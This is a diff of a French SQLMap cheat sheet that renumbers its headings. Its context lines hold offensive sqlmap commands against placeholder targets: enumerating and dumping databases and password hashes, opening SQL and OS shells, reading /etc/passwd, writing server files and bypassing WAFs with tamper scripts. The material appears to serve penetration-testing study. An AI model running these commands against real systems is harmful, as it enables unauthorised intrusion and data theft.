@@ -1,4 +1,4 @@
-# <span style="color:orange;">4. SQL Injection (SQLMap)</span>
+# SQL Injection (SQLMap)
 
 ```bash
 # Détection agressive
@@ -20,9 +20,9 @@
 --technique=BEUSTQ  # Boolean, Error, Union, Stacked, Time, Query
 ```
 
-## 4.1 SQLMap - Commandes Basiques
+## 1 SQLMap - Commandes Basiques
 
-### **Scan GET simple :**
+### 1.1 Scan GET simple :
 
 ```bash
 sqlmap -u "http://sql-sandbox/api?id=1" --dbs
@@ -35,7 +35,7 @@ sqlmap -u "http://sql-sandbox/api?id=1" --dbs
 
 ---
 
-### **Scan POST avec data :**
+### 1.2 Scan POST avec data :
 
 ```bash
 sqlmap -u http://sql-sandbox/sqlmap/api \
@@ -52,12 +52,12 @@ sqlmap -u http://sql-sandbox/sqlmap/api \
 
 ---
 
-### **SQLMap avec multipart/form-data**
+### 1.3 SQLMap avec multipart/form-data
 
-**1ère méthode** 
-Sauvegarder la requête dans un fichier
-dans Burp -> clic droit sur la requête ->Copy to file -> file.txt
-AJOUTER UN * APRES LA VALEUR A TESTER 
+#### 1.3.1 1ère méthode avec fichier 
+Sauvegarder la requête dans un fichier  
+dans Burp -> clic droit sur la requête ->Copy to file -> file.txt  
+AJOUTER UN * APRES LA VALEUR A TESTER   
 ou créer manuellement , exemple :
 ```bash
 POST /auth HTTP/1.1
@@ -94,7 +94,7 @@ sqlmap -r piano-auth.txt --batch --risk 3 --level 5 -p username,password,dType
 sqlmap -r piano-auth.txt --batch -p username
 ```
 
-**2nde méthode**
+#### 1.3.2 2nde méthode en ligne de commande
 ```bash
 sqlmap -u "http://piano/auth" \
   --data="username=admin&password=test&dType=test&_token=q2Fn1UJt1sUevJfhaoi7j1kHWmbKRR1uJtGMQKtI" \
@@ -106,7 +106,7 @@ sqlmap -u "http://piano/auth" \
 
 ---
 
-### **Spécifier SGBD :**
+### 1.4 Spécifier SGBD :
 
 ```bash
 sqlmap -u http://target/api \
@@ -127,7 +127,7 @@ sqlmap -u http://target/api \
 
 ---
 
-### **Ignorer sessions précédentes :**
+### 1.5 Ignorer sessions précédentes :
 
 ```bash
 sqlmap -u http://target/api \
@@ -142,7 +142,7 @@ sqlmap -u http://target/api \
 
 ---
 
-### **Mode batch (pas d'interaction) :**
+### 1.6 Mode batch (pas d'interaction) :
 
 ```bash
 sqlmap -u http://target/api --batch
@@ -155,7 +155,7 @@ sqlmap -u http://target/api --batch
 
 ---
 
-### **Random User-Agent :**
+### 1.7 Random User-Agent :
 
 ```bash
 sqlmap -u http://target/api --random-agent
@@ -167,7 +167,7 @@ sqlmap -u http://target/api --random-agent
 
 ---
 
-### **Threads (parallélisation) :**
+### 1.8 Threads (parallélisation) :
 
 ```bash
 sqlmap -u http://target/api --threads 10
@@ -179,7 +179,7 @@ sqlmap -u http://target/api --threads 10
 
 ---
 
-### **Cookies :**
+### 1.9 Cookies :
 
 ```bash
 sqlmap -u http://target/api --cookie "session=abc123"
@@ -191,7 +191,7 @@ sqlmap -u http://target/api --cookie "session=abc123"
 
 ---
 
-### **Headers personnalisés :**
+### 1.10 Headers personnalisés :
 
 ```bash
 sqlmap -u http://target/api --headers "Authorization: Bearer token"
@@ -203,7 +203,7 @@ sqlmap -u http://target/api --headers "Authorization: Bearer token"
 
 ---
 
-### **Proxy :**
+### 1.11 Proxy :
 
 ```bash
 sqlmap -u http://target/api --proxy http://127.0.0.1:8080
@@ -215,9 +215,9 @@ sqlmap -u http://target/api --proxy http://127.0.0.1:8080
 
 ---
 
-## 4.2 SQLMap - Énumération
+## 2 SQLMap - Énumération
 
-**Lister bases de données :** `--dbms=mysql --dbs`
+### 2.1 Lister bases de données : `--dbms=mysql --dbs`
 
 ```bash
 sqlmap -u http://target/api \
@@ -241,7 +241,7 @@ sqlmap -u http://target/api \
 
 ---
 
-**Base de données courante :**
+### 2.2 Base de données courante :
 
 ```bash
 sqlmap -u http://target/api --current-db
@@ -253,7 +253,7 @@ sqlmap -u http://target/api --current-db
 
 ---
 
-**Utilisateur courant :**
+### 2.3 Utilisateur courant :
 
 ```bash
 sqlmap -u http://target/api --current-user
@@ -265,7 +265,7 @@ sqlmap -u http://target/api --current-user
 
 ---
 
-**Vérifier si DBA :**
+### 2.4 Vérifier si DBA :
 
 ```bash
 sqlmap -u http://target/api --is-dba
@@ -277,7 +277,7 @@ sqlmap -u http://target/api --is-dba
 
 ---
 
-**Lister tables d'une base :**
+### 2.5 Lister tables d'une base :
 
 ```bash
 sqlmap -u http://target/api \
@@ -306,7 +306,7 @@ sqlmap -u http://target/api \
 
 ---
 
-**Lister colonnes d'une table :**
+### 2.6 Lister colonnes d'une table :
 
 ```bash
 sqlmap -u http://target/api \
@@ -337,7 +337,7 @@ sqlmap -u http://target/api \
 
 ---
 
-**Dumper colonnes spécifiques :**
+### 2.7 Dumper colonnes spécifiques :
 
 ```bash
 sqlmap -u http://target/api \
@@ -368,7 +368,7 @@ sqlmap -u http://target/api \
 
 ---
 
-**Dump toute la base :**
+### 2.8 Dump toute la base :
 
 ```bash
 sqlmap -u http://target/api \
@@ -385,7 +385,7 @@ sqlmap -u http://target/api \
 
 ---
 
-**Dump TOUTES les bases :**
+### 2.9 Dump TOUTES les bases :
 
 ```bash
 sqlmap -u http://target/api --dump-all
@@ -398,7 +398,7 @@ sqlmap -u http://target/api --dump-all
 
 ---
 
-**Dump passwords (hashes) :**
+### 2.10 Dump passwords (hashes) :
 
 ```bash
 sqlmap -u http://target/api --passwords
@@ -410,9 +410,9 @@ sqlmap -u http://target/api --passwords
 
 ---
 
-## 4.3 SQLMap - Exploitation Avancée
+## 3 SQLMap - Exploitation Avancée
 
-### **Shell SQL interactif :**
+### 3.1 Shell SQL interactif :
 
 ```bash
 sqlmap -u http://target/api --sql-shell
@@ -424,7 +424,7 @@ sqlmap -u http://target/api --sql-shell
 
 ---
 
-### **Shell OS (si écriture possible) :**
+### 3.2 Shell OS (si écriture possible) :
 
 ```bash
 sqlmap -u http://target/api --os-shell
@@ -438,7 +438,7 @@ sqlmap -u http://target/api --os-shell
 
 ---
 
-### **Lire fichier sur serveur :**
+### 3.3 Lire fichier sur serveur :
 
 ```bash
 sqlmap -u http://target/api --file-read "/etc/passwd"
@@ -450,7 +450,7 @@ sqlmap -u http://target/api --file-read "/etc/passwd"
 
 ---
 
-### **Écrire fichier sur serveur :**
+### 3.4 Écrire fichier sur serveur :
 
 ```bash
 sqlmap -u http://target/api \
@@ -465,7 +465,7 @@ sqlmap -u http://target/api \
 
 ---
 
-### **Techniques SQL injection :**
+### 3.5 Techniques SQL injection :
 
 ```bash
 sqlmap -u http://target/api --technique=BEUST
@@ -493,7 +493,7 @@ sqlmap -u http://target/api --technique=UE
 
 ---
 
-### **Tamper scripts (WAF bypass) :**
+### 3.6 Tamper scripts (WAF bypass) :
 
 ```bash
 # Espace → commentaire
@@ -527,7 +527,7 @@ sqlmap --list-tampers
 
 ---
 
-### **Level et Risk :**
+### 3.7 Level et Risk :
 
 ```bash
 sqlmap -u http://target/api --level=5 --risk=3
@@ -550,35 +550,35 @@ sqlmap -u http://target/api --level=5 --risk=3
 
 ---
 
-## 4.4 SQLMap - Workflow Complet
+## 4 SQLMap - Workflow Complet
 
-### **Méthodologie recommandée :**
+### 4.1 Méthodologie recommandée :
 
-1. **Identifier vulnérabilité + SGBD :**
+**Identifier vulnérabilité + SGBD :**
 
 ```bash
 sqlmap -u http://target/api --data "..." -p "param"
 ```
 
-2. **Lister bases :**
+**Lister bases :**
 
 ```bash
 sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql --dbs --flush-session
 ```
 
-3. **Lister tables :**
+**Lister tables :**
 
 ```bash
 sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base --tables --flush-session
 ```
 
-4. **Lister colonnes :**
+**Lister colonnes :**
 
 ```bash
 sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T nom_table --columns --flush-session
 ```
 
-5. **Dump données :**
+**Dump données :**
 
 ```bash
 sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T nom_table -C col1,col2 --dump --flush-session
@@ -586,7 +586,7 @@ sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T 
 
 ---
 
-### **Depuis requête Burp :**
+### 4.2 Depuis requête Burp :
 
 ```bash
 # Sauvegarder requête HTTP depuis Burp
